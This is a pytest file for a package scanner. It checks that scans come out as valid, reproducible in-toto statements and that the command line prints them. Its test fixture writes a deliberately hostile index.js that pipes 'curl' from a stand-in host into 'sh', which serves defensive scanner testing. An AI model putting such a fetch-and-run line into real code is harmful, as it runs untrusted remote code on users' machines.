"""The scanner emits its scan as an in-toto statement whose predicate is the `scan/v1` record, validated, and the command line prints it.

`--format statement` writes one canonical JSON line. It is the statement a signature can cover: its one subject is the predicate's own digest. It is checked against the statement schema and the `scan/v1`
schema before it is written.
"""

from __future__ import annotations

import hashlib
import json
from pathlib import Path
from typing import Any

import pytest

from cordon_scanner import Scanner
from cordon_scanner.cli.main import CommandLine
from cordon_scanner.contracts.schemas import Statements
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.errors import CordonError
from cordon_scanner.report.statement import PREDICATE_TYPE, STATEMENT_TYPE, ScanStatement


class Fixture:
    @staticmethod
    def package(root: Path, *, hostile: bool = False) -> Path:
        (root / "package.json").write_text(
            json.dumps({"name": "p", "version": "1.0.0", "main": "index.js"}), encoding="utf-8"
        )
        body = (
            "const cp = require('child_process');\ncp.exec('curl -s https://example.invalid/x | sh');\n"
            if hostile
            else "module.exports = 1;\n"
        )
        (root / "index.js").write_text(body, encoding="utf-8")
        return root

    @staticmethod
    def statement(root: Path) -> dict[str, Any]:
        return ScanStatement.of(
            Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        )


class TestTheStatementIsValid:
    @pytest.mark.parametrize("hostile", [False, True])
    def test_it_validates_against_the_statement_and_the_scan_schemas(
        self, tmp_path: Path, hostile: bool
    ) -> None:
        statement = Fixture.statement(Fixture.package(tmp_path, hostile=hostile))
        assert Statements.validate(statement) == []
        assert statement["_type"] == STATEMENT_TYPE and statement["predicateType"] == PREDICATE_TYPE

    def test_its_subject_is_the_digest_of_its_own_predicate(self, tmp_path: Path) -> None:
        statement = Fixture.statement(Fixture.package(tmp_path))
        digest = hashlib.sha256(ScanStatement.canonical(statement["predicate"])).hexdigest()
        assert statement["subject"][0]["digest"] == {"sha256": digest}

    def test_a_hostile_package_has_its_findings_in_the_predicate(self, tmp_path: Path) -> None:
        statement = Fixture.statement(Fixture.package(tmp_path, hostile=True))
        assert statement["predicate"]["findings"]
        assert {"rule_id", "severity", "confidence", "category"} <= set(
            statement["predicate"]["findings"][0]
        )

    def test_the_same_scan_twice_gives_the_same_bytes(self, tmp_path: Path) -> None:
        root = Fixture.package(tmp_path, hostile=True)
        assert ScanStatement.canonical(Fixture.statement(root)) == ScanStatement.canonical(
            Fixture.statement(root)
        )

    def test_a_statement_that_would_not_validate_is_not_made(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from cordon_scanner.cloud import minimal_record

        monkeypatch.setattr(
            minimal_record.MinimalRecord,
            "of",
            staticmethod(lambda result: {"findings": "not a list"}),
        )
        with pytest.raises(CordonError, match="does not validate"):
            Fixture.statement(Fixture.package(tmp_path))


class TestTheCommandLinePrintsIt:
    def test_format_statement_prints_one_valid_line(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        root = Fixture.package(tmp_path, hostile=True)
        code = CommandLine.main(
            ["scan", str(root), "--format", "statement", "--offline", "--no-color", "--quiet"]
        )
        lines = [line for line in capsys.readouterr().out.splitlines() if line.strip()]
        assert code in (0, 1) and len(lines) == 1
        assert Statements.validate(json.loads(lines[0])) == []

    def test_it_can_be_written_to_a_file(self, tmp_path: Path) -> None:
        root = (
            Fixture.package(tmp_path / "pkg", hostile=True)
            if (tmp_path / "pkg").mkdir() is None
            else tmp_path
        )
        out = tmp_path / "scan.statement.json"
        CommandLine.main(
            [
                "scan",
                str(root),
                "--format",
                f"statement:{out}",
                "--offline",
                "--no-color",
                "--quiet",
            ]
        )
        assert Statements.validate(json.loads(out.read_text(encoding="utf-8"))) == []
